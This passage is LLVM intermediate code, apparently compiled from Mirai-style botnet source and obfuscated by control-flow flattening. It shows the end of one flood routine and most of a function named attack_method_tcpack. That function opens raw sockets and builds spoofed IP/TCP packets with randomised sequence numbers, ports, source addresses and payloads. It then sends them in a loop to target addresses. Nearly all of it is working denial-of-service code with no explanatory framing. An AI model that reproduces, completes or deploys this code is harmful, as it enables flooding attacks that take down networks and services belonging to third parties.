  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = call i32 @rand_next()
  %388 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 2
  store i32 %387, i32* %389, align 4
  store i32 -1700875817, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i32, i32* %19, align 4
  %392 = icmp eq i32 %391, 65535
  %393 = select i1 %392, i32 932889696, i32 -1179025145
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = call i32 @rand_next()
  %396 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 3
  store i32 %395, i32* %397, align 4
  store i32 -1179025145, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i8, i8* %20, align 1
  %400 = icmp ne i8 %399, 0
  %401 = select i1 %400, i32 -1628951855, i32 -197081053
  store i32 %401, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = call i32 @rand_next()
  %404 = and i32 %403, 65535
  %405 = trunc i32 %404 to i16
  %406 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 7
  store i16 %405, i16* %407, align 2
  store i32 -197081053, i32* %switchVar
  br label %loopEnd

; <label>:408:                                    ; preds = %loopEntry
  %409 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 7
  store i16 0, i16* %410, align 2
  %411 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %412 = bitcast %struct.iphdr* %411 to i16*
  %413 = call zeroext i16 @checksum_generic(i16* %412, i32 20)
  %414 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 7
  store i16 %413, i16* %415, align 2
  %416 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %417 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %416, i32 0, i32 6
  store i16 0, i16* %417, align 4
  %418 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %419 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %420 = bitcast %struct.tcphdr* %419 to i8*
  %421 = call zeroext i16 @htons(i16 zeroext 40) #7
  %422 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %418, i8* %420, i16 zeroext %421, i32 40)
  %423 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %424 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %423, i32 0, i32 6
  store i16 %422, i16* %424, align 4
  %425 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %426 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %425, i32 0, i32 1
  %427 = load i16, i16* %426, align 2
  %428 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %429 = load i32, i32* %9, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %428, i64 %430
  %432 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %431, i32 0, i32 0
  %433 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %432, i32 0, i32 1
  store i16 %427, i16* %433, align 2
  %434 = load i32, i32* %10, align 4
  %435 = load i8*, i8** %30, align 8
  %436 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %437 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %438 = load i32, i32* %9, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %437, i64 %439
  %441 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %440, i32 0, i32 0
  %442 = bitcast %struct.sockaddr_in* %441 to %struct.sockaddr*
  store %struct.sockaddr* %442, %struct.sockaddr** %436, align 8
  %443 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %444 = load %struct.sockaddr*, %struct.sockaddr** %443, align 8
  %445 = call i64 @sendto(i32 %434, i8* %435, i64 60, i32 16384, %struct.sockaddr* %444, i32 16)
  store i32 569858722, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  %447 = load i32, i32* %9, align 4
  %448 = add nsw i32 %447, 1
  store i32 %448, i32* %9, align 4
  store i32 1673702213, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  store i32 -1435354734, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %449, %446, %408, %402, %398, %394, %390, %386, %382, %376, %371, %365, %360, %354, %349, %345, %341, %320, %300, %294, %293, %292, %289, %164, %160, %116, %110, %109, %106, %100, %99, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 497781738, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 497781738, label %first
    i32 -44483609, label %109
    i32 -1570155997, label %110
    i32 587550279, label %116
    i32 1828847043, label %119
    i32 -143401387, label %120
    i32 1819663376, label %126
    i32 1188248306, label %174
    i32 -1287679869, label %178
    i32 -1715542881, label %273
    i32 1551906426, label %279
    i32 1878298002, label %282
    i32 1706385212, label %285
    i32 1016369072, label %286
    i32 -1542938346, label %287
    i32 1650473376, label %293
    i32 -1194557147, label %316
    i32 150913241, label %337
    i32 194263015, label %341
    i32 833481323, label %345
    i32 -704512165, label %350
    i32 -1489655244, label %356
    i32 -110998105, label %361
    i32 957705379, label %367
    i32 -143644263, label %372
    i32 1249396206, label %378
    i32 -258411417, label %382
    i32 -1499915969, label %386
    i32 -1133875996, label %390
    i32 -2034980444, label %394
    i32 1661182342, label %398
    i32 30867763, label %401
    i32 1088974114, label %450
    i32 1681348693, label %453
    i32 816916025, label %454
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %107 = icmp eq i32 %.reload, -1
  %108 = select i1 %107, i32 -44483609, i32 -1570155997
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 816916025, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %111 = load i32, i32* %10, align 4
  %112 = bitcast i32* %9 to i8*
  %113 = call i32 @setsockopt(i32 %111, i32 0, i32 3, i8* %112, i32 4) #6
  %114 = icmp eq i32 %113, -1
  %115 = select i1 %114, i32 587550279, i32 1828847043
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = load i32, i32* %10, align 4
  %118 = call i32 @close(i32 %117)
  store i32 816916025, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -143401387, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %9, align 4
  %122 = load i8, i8* %5, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %121, %123
  %125 = select i1 %124, i32 1819663376, i32 1706385212
  store i32 %125, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %128 = load i8**, i8*** %11, align 8
  %129 = load i32, i32* %9, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8*, i8** %128, i64 %130
  store i8* %127, i8** %131, align 8
  %132 = load i8**, i8*** %11, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds i8*, i8** %132, i64 %134
  %136 = load i8*, i8** %135, align 8
  %137 = bitcast i8* %136 to %struct.iphdr*
  store %struct.iphdr* %137, %struct.iphdr** %29, align 8
  %138 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %139 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %138, i64 1
  %140 = bitcast %struct.iphdr* %139 to %struct.tcphdr*
  store %struct.tcphdr* %140, %struct.tcphdr** %30, align 8
  %141 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %142 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %141, i64 1
  %143 = bitcast %struct.tcphdr* %142 to i8*
  store i8* %143, i8** %31, align 8
  %144 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %145 = bitcast %struct.iphdr* %144 to i8*
  %146 = load i8, i8* %145, align 4
  %147 = and i8 %146, 15
  %148 = or i8 %147, 64
  store i8 %148, i8* %145, align 4
  %149 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %150 = bitcast %struct.iphdr* %149 to i8*
  %151 = load i8, i8* %150, align 4
  %152 = and i8 %151, -16
  %153 = or i8 %152, 5
  store i8 %153, i8* %150, align 4
  %154 = load i8, i8* %12, align 1
  %155 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 1
  store i8 %154, i8* %156, align 1
  %157 = load i32, i32* %26, align 4
  %158 = sext i32 %157 to i64
  %159 = add i64 40, %158
  %160 = trunc i64 %159 to i16
  %161 = call zeroext i16 @htons(i16 zeroext %160) #7
  %162 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 2
  store i16 %161, i16* %163, align 2
  %164 = load i16, i16* %13, align 2
  %165 = call zeroext i16 @htons(i16 zeroext %164) #7
  %166 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 3
  store i16 %165, i16* %167, align 4
  %168 = load i8, i8* %14, align 1
  %169 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 5
  store i8 %168, i8* %170, align 4
  %171 = load i8, i8* %15, align 1
  %172 = icmp ne i8 %171, 0
  %173 = select i1 %172, i32 1188248306, i32 -1287679869
  store i32 %173, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %176 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 4
  store i16 %175, i16* %177, align 2
  store i32 -1287679869, i32* %switchVar
  br label %loopEnd

; <label>:178:                                    ; preds = %loopEntry
  %179 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 6
  store i8 6, i8* %180, align 1
  %181 = load i32, i32* %28, align 4
  %182 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 8
  store i32 %181, i32* %183, align 4
  %184 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %185 = load i32, i32* %9, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i64 %186
  %188 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %187, i32 0, i32 1
  %189 = load i32, i32* %188, align 4
  %190 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 9
  store i32 %189, i32* %191, align 4
  %192 = load i16, i16* %16, align 2
  %193 = call zeroext i16 @htons(i16 zeroext %192) #7
  %194 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %195 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %194, i32 0, i32 0
  store i16 %193, i16* %195, align 4
  %196 = load i16, i16* %17, align 2
  %197 = call zeroext i16 @htons(i16 zeroext %196) #7
  %198 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 1
  store i16 %197, i16* %199, align 2
  %200 = load i32, i32* %18, align 4
  %201 = trunc i32 %200 to i16
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = zext i16 %202 to i32
  %204 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 2
  store i32 %203, i32* %205, align 4
  %206 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %207 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %206, i32 0, i32 4
  %208 = load i16, i16* %207, align 4
  %209 = and i16 %208, -241
  %210 = or i16 %209, 80
  store i16 %210, i16* %207, align 4
  %211 = load i8, i8* %20, align 1
  %212 = sext i8 %211 to i16
  %213 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 4
  %215 = load i16, i16* %214, align 4
  %216 = and i16 %212, 1
  %217 = shl i16 %216, 13
  %218 = and i16 %215, -8193
  %219 = or i16 %218, %217
  store i16 %219, i16* %214, align 4
  %220 = load i8, i8* %21, align 1
  %221 = sext i8 %220 to i16
  %222 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 4
  %224 = load i16, i16* %223, align 4
  %225 = and i16 %221, 1
  %226 = shl i16 %225, 12
  %227 = and i16 %224, -4097
  %228 = or i16 %227, %226
  store i16 %228, i16* %223, align 4
  %229 = load i8, i8* %22, align 1
  %230 = sext i8 %229 to i16
  %231 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %232 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %231, i32 0, i32 4
  %233 = load i16, i16* %232, align 4
  %234 = and i16 %230, 1
  %235 = shl i16 %234, 11
  %236 = and i16 %233, -2049
  %237 = or i16 %236, %235
  store i16 %237, i16* %232, align 4
  %238 = load i8, i8* %23, align 1
  %239 = sext i8 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 4
  %242 = load i16, i16* %241, align 4
  %243 = and i16 %239, 1
  %244 = shl i16 %243, 10
  %245 = and i16 %242, -1025
  %246 = or i16 %245, %244
  store i16 %246, i16* %241, align 4
  %247 = load i8, i8* %24, align 1
  %248 = sext i8 %247 to i16
  %249 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %250 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %249, i32 0, i32 4
  %251 = load i16, i16* %250, align 4
  %252 = and i16 %248, 1
  %253 = shl i16 %252, 9
  %254 = and i16 %251, -513
  %255 = or i16 %254, %253
  store i16 %255, i16* %250, align 4
  %256 = load i8, i8* %25, align 1
  %257 = sext i8 %256 to i16
  %258 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %259 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %258, i32 0, i32 4
  %260 = load i16, i16* %259, align 4
  %261 = and i16 %257, 1
  %262 = shl i16 %261, 8
  %263 = and i16 %260, -257
  %264 = or i16 %263, %262
  store i16 %264, i16* %259, align 4
  %265 = call i32 @rand_next()
  %266 = and i32 %265, 65535
  %267 = trunc i32 %266 to i16
  %268 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %269 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %268, i32 0, i32 5
  store i16 %267, i16* %269, align 2
  %270 = load i8, i8* %22, align 1
  %271 = icmp ne i8 %270, 0
  %272 = select i1 %271, i32 -1715542881, i32 1551906426
  store i32 %272, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %274 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %275 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %274, i32 0, i32 4
  %276 = load i16, i16* %275, align 4
  %277 = and i16 %276, -2049
  %278 = or i16 %277, 2048
  store i16 %278, i16* %275, align 4
  store i32 1551906426, i32* %switchVar
  br label %loopEnd

; <label>:279:                                    ; preds = %loopEntry
  %280 = load i8*, i8** %31, align 8
  %281 = load i32, i32* %26, align 4
  call void @rand_str(i8* %280, i32 %281)
  store i32 1878298002, i32* %switchVar
  br label %loopEnd

; <label>:282:                                    ; preds = %loopEntry
  %283 = load i32, i32* %9, align 4
  %284 = add nsw i32 %283, 1
  store i32 %284, i32* %9, align 4
  store i32 -143401387, i32* %switchVar
  br label %loopEnd

; <label>:285:                                    ; preds = %loopEntry
  store i32 1016369072, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1542938346, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i32, i32* %9, align 4
  %289 = load i8, i8* %5, align 1
  %290 = zext i8 %289 to i32
  %291 = icmp slt i32 %288, %290
  %292 = select i1 %291, i32 1650473376, i32 1681348693
  store i32 %292, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  %294 = load i8**, i8*** %11, align 8
  %295 = load i32, i32* %9, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds i8*, i8** %294, i64 %296
  %298 = load i8*, i8** %297, align 8
  store i8* %298, i8** %32, align 8
  %299 = load i8*, i8** %32, align 8
  %300 = bitcast i8* %299 to %struct.iphdr*
  store %struct.iphdr* %300, %struct.iphdr** %33, align 8
  %301 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i64 1
  %303 = bitcast %struct.iphdr* %302 to %struct.tcphdr*
  store %struct.tcphdr* %303, %struct.tcphdr** %34, align 8
  %304 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %305 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %304, i64 1
  %306 = bitcast %struct.tcphdr* %305 to i8*
  store i8* %306, i8** %35, align 8
  %307 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %308 = load i32, i32* %9, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %307, i64 %309
  %311 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i32 0, i32 2
  %312 = load i8, i8* %311, align 4
  %313 = zext i8 %312 to i32
  %314 = icmp slt i32 %313, 32
  %315 = select i1 %314, i32 -1194557147, i32 150913241
  store i32 %315, i32* %switchVar
  br label %loopEnd

; <label>:316:                                    ; preds = %loopEntry
  %317 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %318 = load i32, i32* %9, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %317, i64 %319
  %321 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %320, i32 0, i32 1
  %322 = load i32, i32* %321, align 4
  %323 = call i32 @ntohl(i32 %322) #7
  %324 = call i32 @rand_next()
  %325 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %326 = load i32, i32* %9, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %325, i64 %327
  %329 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %328, i32 0, i32 2
  %330 = load i8, i8* %329, align 4
  %331 = zext i8 %330 to i32
  %332 = lshr i32 %324, %331
  %333 = add i32 %323, %332
  %334 = call i32 @htonl(i32 %333) #7
  %335 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 9
  store i32 %334, i32* %336, align 4
  store i32 150913241, i32* %switchVar
  br label %loopEnd

; <label>:337:                                    ; preds = %loopEntry
  %338 = load i32, i32* %28, align 4
  %339 = icmp eq i32 %338, -1
  %340 = select i1 %339, i32 194263015, i32 833481323
  store i32 %340, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = call i32 @rand_next()
  %343 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %344 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %343, i32 0, i32 8
  store i32 %342, i32* %344, align 4
  store i32 833481323, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = load i16, i16* %13, align 2
  %347 = zext i16 %346 to i32
  %348 = icmp eq i32 %347, 65535
  %349 = select i1 %348, i32 -704512165, i32 -1489655244
  store i32 %349, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  %351 = call i32 @rand_next()
  %352 = and i32 %351, 65535
  %353 = trunc i32 %352 to i16
  %354 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %355 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %354, i32 0, i32 3
  store i16 %353, i16* %355, align 4
  store i32 -1489655244, i32* %switchVar
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  %357 = load i16, i16* %16, align 2
  %358 = zext i16 %357 to i32
  %359 = icmp eq i32 %358, 65535
  %360 = select i1 %359, i32 -110998105, i32 957705379
  store i32 %360, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  %362 = call i32 @rand_next()
  %363 = and i32 %362, 65535
  %364 = trunc i32 %363 to i16
  %365 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %366 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %365, i32 0, i32 0
  store i16 %364, i16* %366, align 4
  store i32 957705379, i32* %switchVar
  br label %loopEnd

; <label>:367:                                    ; preds = %loopEntry
  %368 = load i16, i16* %17, align 2
  %369 = zext i16 %368 to i32
  %370 = icmp eq i32 %369, 65535
  %371 = select i1 %370, i32 -143644263, i32 1249396206
  store i32 %371, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  %373 = call i32 @rand_next()
  %374 = and i32 %373, 65535
  %375 = trunc i32 %374 to i16
  %376 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %377 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %376, i32 0, i32 1
  store i16 %375, i16* %377, align 2
  store i32 1249396206, i32* %switchVar
  br label %loopEnd

; <label>:378:                                    ; preds = %loopEntry
  %379 = load i32, i32* %18, align 4
  %380 = icmp eq i32 %379, 65535
  %381 = select i1 %380, i32 -258411417, i32 -1499915969
  store i32 %381, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
